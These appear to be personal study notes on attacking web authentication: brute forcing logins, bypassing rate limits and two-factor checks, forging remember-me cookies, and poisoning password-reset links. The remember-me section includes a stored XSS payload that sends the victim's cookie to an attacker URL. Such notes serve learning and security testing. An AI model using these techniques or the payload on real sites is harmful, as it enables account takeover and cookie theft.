
### General Notes

> The process of verifying the identity of a user.

* Knowledge Factors: Something you know like a password.
* Possesion Factors: Something you have like a security token.
* Inherence Factors: Something you are like biometrics.

> Authentication is verifying that a user is who they claim to be.
> Authorization is verifying whether a user is allowed to do something.

---

### Password Attacks

> Against websites that have username-password based login mechanisms.

##### Brute Force Attacks

> Trial and error attempts to guess valid user credentials.
> While brute forcing, must pay attention to: 
1. Status Codes: [[HTTP]] response codes can be observed. Sometimes the right username gives a different response than a wrong username.
2. Error Messages: Returned error messages are sometimes different when both username *and* password are incorrect, not just one of them. Observe characters for spelling mistakes, and so on.
3. Response Times: Observe response times. Sometimes websites will check password only if username is correct, so the response time increases. Can be checked by entering really large passwords, to make the website take longer to respond.

> Can be done via [[Burp Suite]] Intruder.
> To ensure 1 request is sent a time (if needed), go to resources pool tab and set the max concurrent requests to 1.

> If there is [[IP]] blocking, use the `X-Forwarded-For` [[HTTP]] header to change the IP address.
> If there is account locking, check all the usernames and don't exceed the password limit trials.

> User rate limiting occurs when making too many login attempts in a short period of time causing the [[IP]] to get blocked.
> IP can be unblocked by:
1. Manually by admin.
2. Manually by user after completing a CAPTCHA.
3. Automatically after a certain time period.
> User rate limiting can be bypassed by trying multiple passwords in one login request.

##### [[HTTP]] Basic Authentication

> Client recieves token from server constructed by concatenating username and password and then encoding in Base64. ([[Web Encoding]])
> This token is stored in the browser, and adds it in the `authorization` header of every request.
```
Authorization: Basic base64(username:password)
```

---

### Multi-Factor Authentication

##### Bypassing Two-Factor Authentication

> When users login and then are asked to enter some sort of verification code, they are already logged in.
> Sometimes, some pages are loaded before this verification stage is completed.

> To exploit this, login as a normal user and observe the URL paths that are after the verification stage.
> Then login as the victim user, and once asked for the verification, simply change the URL to another path to see if this stage can be altogether skipped.

##### Flawed Two-Factor Authentication

> After user has logged in, the website doesn't properly verify that it is the same user completing the second step; verification.

> Users are assigned [[Cookies]] when they are logged in that relate to their account. 
> This cookie is the same one that is taken to the verification stage.
> When the verification code is submitted, the cookie is used to determine the account the user is trying to access.

> An attacker coud login using his credentials, and then change his cookie to that of a victim user's.
> He would then have to brute force or guess the verification code in order to gain access to that account without even needing the password.

> Use the [[Burp Suite]] Turbo Intruder extension for increased speed in brute forcing verification codes.
> Can also be used to change macros, such as changing the session or logging in/out to avoid being blocked.

---

### Other Authentication Mechanisms


##### Keeping Users Logged In

> The 'remember me' feature is implemented by storing persistent [[Cookies]].
> Access to these cookies is dangerous as it skips the entire login process.

> These cookies can be generated via static value concatenation such as username, timestamp, password.
> If attacker can study their own cookie, they can figure out how these cookies are generated.

> Some websites have [[Web Encoding]] such as Base64, which can be easily decrypted.
> Using hashing functions is also not perfect as if the attacker identifies the hashing algorithm, they can brute force it using a wordlist using tools such as [[John the Ripper]].

> If attacker can't create an account, they can using [[Cross Site Scripting (XSS)]] steal another user's cookie and deduce how the cookie forms.
> Performing a stored attack to steal cookies:
``` HTML
<script>document.location='URL-to-send-to/'+document.cookie</script>
```

##### Resetting User Passwords

> Through the URL, users are taken to a unique page to reset their password.
```
http://website.com/reset-password?user=<victim>
```
> Not secure as attacker could change the victim username to any user and can change any users password.

> Using a long token for each user that is checked in the backend and then destroyed shortly after resetting the password.
> Sometimes, websites dont validate tokens, and attackers could reset their own password, then change that token to gain access to any user they need.
> This can be done by trying to delete the token value, and see if the website still responds properly.

> Another technique is to steal another user's token.
> Use the `X-Forwarded-Host` [[HTTP]] header to send the reset password email. 
> Let the value of that header to be my own website, so i can see the requests if clicked on by the victim user.
> Having the victim user token, I can open my own reset password page, but change the token to that of the victim user's.
> I can then reset the password.

##### Changing User Passwords

> Changing password means entering current password and then the new password twice.
> These features can be dangerous if attackers can access them without being logged in as the victim.

> Try different combinations of entering the correct current password and incorrect current password, and matching and not matching new passwords.
> Observe the responses for each combination, and check if a pattern is in place that can be cracked.

---
